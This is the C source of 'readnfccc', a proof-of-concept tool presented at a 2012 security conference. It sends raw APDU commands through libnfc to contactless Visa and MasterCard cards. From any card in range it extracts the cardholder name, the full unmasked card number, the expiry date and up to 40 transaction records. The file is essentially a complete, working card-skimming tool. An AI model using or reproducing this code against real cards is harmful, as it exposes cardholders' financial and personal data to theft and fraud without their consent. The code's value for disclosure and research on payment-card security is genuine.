/*

readnfccc - by Renaud Lifchitz (renaud.lifchitz@bt.com)
Some improvements by Kevin Soules (eax64: kevin@libdev.so)

License: distributed under GPL version 3 (http://www.gnu.org/licenses/gpl.html)

* Introduction:
"Quick and dirty" proof-of-concept
Open source tool developped and showed for Hackito Ergo Sum 2012 - "Hacking the NFC credit cards for fun and debit ;)"
Reads NFC credit card personal data (gender, first name, last name, PAN, expiration date, transaction history...) 

* Requirements:
libnfc (>= 1.6.0-rc1) and a suitable NFC reader (http://www.libnfc.org/documentation/hardware/compatibility)

* Compilation: 
$ make

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <nfc/nfc.h>
#include <stdint.h>
#include "codes.h"

// Choose whether to mask the PAN or not
#define MASKED 0
#define MAX_FRAME_LEN 300

enum e_card_type {CARD_TYPE_VISA, CARD_TYPE_MC};

extern t_codes g_currency[];
extern t_codes g_country[];

const uint8_t START_14443A[] = {0x4A, 0x01, 0x00};

const uint8_t SELECT_APP[] = {0x40,0x01,0x00,0xA4,0x04,0x00,0x07,0xA0,0x00,0x00,0x00,0x42,0x10,0x10,0x00};
const uint8_t SELECT_APP2[] = {0x40,0x01,0x00,0xA4,0x04,0x00,0x07,0xA0,0x00,0x00,0x00,0x03,0x10,0x10,0x00};

const uint8_t READ_RECORD_VISA[] = {0x40, 0x01, 0x00, 0xB2, 0x02, 0x0C, 0x00, 0x00};
const uint8_t READ_RECORD_MC[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x14, 0x00, 0x00};

uint8_t READ_PAYLOG_VISA[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x8C, 0x00, 0x00};
uint8_t READ_PAYLOG_MC[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x5C, 0x00, 0x00};


void	nfcerror_exit(nfc_device *pnd, char *s)
{
  nfc_perror(pnd, s);
  exit(EXIT_FAILURE);
}

void show(size_t recvlg, uint8_t *recv)
{
  size_t i;

  printf("< ");
  for(i = 0 ; i < recvlg ; i++) {
    printf("%02x ",(unsigned int) recv[i]);
  }
  printf("\n");
}

void		get_info(uint8_t *res, size_t len, enum e_card_type type)
{
  size_t	i;
  size_t	j;
  size_t	expiry;
  char		*p;
  uint8_t	marker;
  unsigned char	output[50];
  char		c;

  marker = 0x4d;
  if (type == CARD_TYPE_MC)
    marker = 0x9c;

  /* Look for cardholder name */
  p = res;
  for(i = 0 ; i < len - 1 ; i++) {
    if(*p == 0x5f && *(p+1) == 0x20) {
      strncpy(output, p+3, (int) *(p+2));
      output[(int) *(p+2)]=0;
      printf("Cardholder name: %s\n",output);
      break;
    }
    p++;
  }

  /* Look for PAN & Expiry date */
  p = res;
  for(i = 0 ; i < len - 1 ; i++) {
    if(*p == marker && *(p+1) == 0x57) {
      strncpy(output, p+3, 13);
      output[11]=0;
      printf("PAN:");
					
      for(j = 0 ; j < 8 ; j++) {
	if(j % 2 == 0)
	  printf(" ");
	c = output[j];
	if(MASKED & (j >= 2) & (j <= 5))
	  printf("**");
	else
	  printf("%02x",c&0xff);
      }
      printf("\n");
      expiry = (output[10] + (output[9] << 8) + (output[8] << 16)) >> 4;
      printf("Expiration date: %02x/20%02x\n\n", (expiry & 0xff), ((expiry >> 8) & 0xff));
      break;
    }
    p++;
  }

}

void		get_history(nfc_device *pnd, enum e_card_type type)
{
  size_t	i;
  uint8_t	*p;
  size_t	len;
  int		ret;
  uint8_t	bufRx[MAX_FRAME_LEN];
  unsigned char	msg[50];
  char		amount[10];
  uint16_t	countryCode;
  uint16_t	currencyCode;

  if (type == CARD_TYPE_VISA)
    {
      len = sizeof(READ_PAYLOG_VISA);
      p = READ_PAYLOG_VISA;
    }
  else if (type == CARD_TYPE_MC)
    {
      len = sizeof(READ_PAYLOG_MC);
      p = READ_PAYLOG_MC;
    }
  else
    return;

  for(i=1 ; i <= 40 ; i++) {
    p[4] = i;

    ret = pn53x_transceive(pnd, p, len, bufRx, MAX_FRAME_LEN, 0);
    if (ret < 0)
      nfcerror_exit(pnd, "pn53x_transceive(..., READ_RECORD, ..)");
    show(ret, bufRx);

    if(ret == 18) // empty transaction
      continue;

    /* Look for date */
    sprintf(msg, "%02x/%02x/20%02x", bufRx[14], bufRx[13], bufRx[12]);

    /* Look for transaction type */
    if(bufRx[15]==0)
      sprintf(msg,"%s %s",msg,"Payment");
    else if(bufRx[15]==1)
      sprintf(msg,"%s %s",msg,"Withdrawal");
				
    /* Look for amount*/
    sprintf(amount, "%02x%02x%02x", bufRx[3], bufRx[4], bufRx[5]);

    /* Look for country and currency */
    countryCode = *(uint16_t*)(bufRx + 8);
    currencyCode = *(uint16_t*)(bufRx + 10);

    sprintf(msg, "%s\t%d,%02x %s (%s)",
	    msg,
	    atoi(amount),
	    bufRx[6],
	    codeToStr(g_currency, currencyCode),
	    codeToStr(g_country, countryCode));

    printf("%s\n",msg);
  }
}

int		main()
{
  nfc_device	*pnd;
  nfc_context	*ctx;
  uint8_t	bufRx[MAX_FRAME_LEN];
  int		ret;

  nfc_init(&ctx);
  pnd = nfc_open(ctx, NULL);
  if (!pnd)
    {
      printf("Unable to connect to NFC device.\n");
      exit(EXIT_FAILURE);
    }

  if (nfc_initiator_init(pnd) < 0)
    nfcerror_exit(pnd, "nfc_initiator_init()");

  if ((ret = pn53x_transceive(pnd, START_14443A, sizeof(START_14443A), bufRx, MAX_FRAME_LEN, 0)) < 0)
    nfcerror_exit(pnd, "pn53x_transceive(..., START_14443A, ..)");

  if ((ret = pn53x_transceive(pnd, SELECT_APP, sizeof(SELECT_APP), bufRx, MAX_FRAME_LEN, 0)) < 0)
    nfcerror_exit(pnd, "pn53x_transceive(..., SELECT_APP, ..)");

  if ((ret = pn53x_transceive(pnd, READ_RECORD_VISA, sizeof(READ_RECORD_VISA), bufRx, MAX_FRAME_LEN, 0)) < 0)
    nfcerror_exit(pnd, "pn53x_transceive(..., SELECT_APP, ..)");

  get_info(bufRx, ret, CARD_TYPE_VISA);
  get_info(bufRx, ret, CARD_TYPE_MC);
  get_history(pnd, CARD_TYPE_VISA);
  get_history(pnd, CARD_TYPE_MC);

  if ((ret = pn53x_transceive(pnd, SELECT_APP2, sizeof(SELECT_APP2), bufRx, MAX_FRAME_LEN, 0)) < 0)
    nfcerror_exit(pnd, "pn53x_transceive(..., SELECT_APP, ..)");

  get_history(pnd, CARD_TYPE_VISA);
  get_history(pnd, CARD_TYPE_MC);

  nfc_close(pnd);
  nfc_exit(ctx);
  return (0);
}
